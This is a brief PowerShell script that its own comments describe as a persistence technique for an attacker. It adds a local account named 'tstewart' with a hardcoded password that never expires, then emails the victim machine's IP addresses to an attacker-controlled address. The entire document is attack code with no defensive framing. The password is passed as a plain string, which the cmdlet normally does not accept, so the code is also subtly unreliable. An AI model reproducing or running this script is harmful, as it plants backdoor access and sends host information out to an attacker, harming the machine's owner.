# Script for adding a new user as a method for persistence on a local machine helpful when there maybe connectivity issues
# Also sends an email to attacker reporting IP 
#
#
#
New-LocalUser -Name tstewart -Password L0LCatZMS -AccountNeverExpires -PasswordNeverExpires
Get-NetIPAddress | Send-MailMessage -From target@email.com -Subject IP -To youraddy@here.com 